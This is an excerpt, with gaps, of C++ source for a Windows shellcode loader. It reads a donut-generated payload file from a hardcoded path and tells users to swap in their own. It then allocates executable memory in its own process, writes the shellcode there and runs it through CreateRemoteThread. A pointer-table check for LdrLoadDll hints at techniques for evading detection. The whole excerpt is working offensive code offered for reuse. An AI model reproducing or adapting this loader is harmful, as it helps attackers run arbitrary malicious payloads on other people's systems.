...
int main(int argc, char *argv[])
{
	...
	if (g_ptr_table.LdrLoadDll == 0) {
		...
		// read .bin file and store in buffer
		std::ifstream file("C:\\Users\\0xn4d\\Desktop\\tools\\donut\\loader.bin", std::ios::binary); //change here to your bin file
		if (!file.is_open()) {
			std::cerr << "Unable to open file"; //if it is unable to open the file, error.
			return 1;
		}
		...
		if (size <= 0) { //if size is equals or less than 0, error...
			std::cerr << "File is empty or cannot determine file size." << std::endl;
			return 1;
		}

		std::vector<char> buffer(std::istreambuf_iterator<char>(file), {}); //reading the file bytes with two iterators

		//std::cout << "Size: " << size << std::endl; //print the sice variable to compare with the file's original size
		//######################################################################################################################
		
		// inject the bytes in the process
		DWORD pid = GetCurrentProcessId(); //getting the current process pid
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if (hProcess == NULL) {
			std::cerr << "Couldn't open process. Error: " << GetLastError() << std::endl;
			return  1;
		}

		// allocating memory in process for the shellcode
		printf("\n\n [*] Allocating memory in the process...");
		LPVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		...
		// writing shellcode into the allocated memory
		printf("\n\n [*] Writing shellcode into 0x%p...", pRemoteShellcode);
		if (!WriteProcessMemory(hProcess, pRemoteShellcode, buffer.data(), size, NULL)) {
			std::cerr << "Couldn't write shellcode. Error: " << GetLastError() << std::endl;
			VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
			CloseHandle(hProcess);
			return  1;
		}

		// creating a new thread for the shellcode execution
		printf("\n\n [*] Creating new thread for shellcode execution...");
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
		if (hThread == NULL) {
			std::cerr << "Couldn't create a new thread. Error: " << GetLastError() << std::endl;
			VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
			CloseHandle(hProcess);
			return  1;
		}
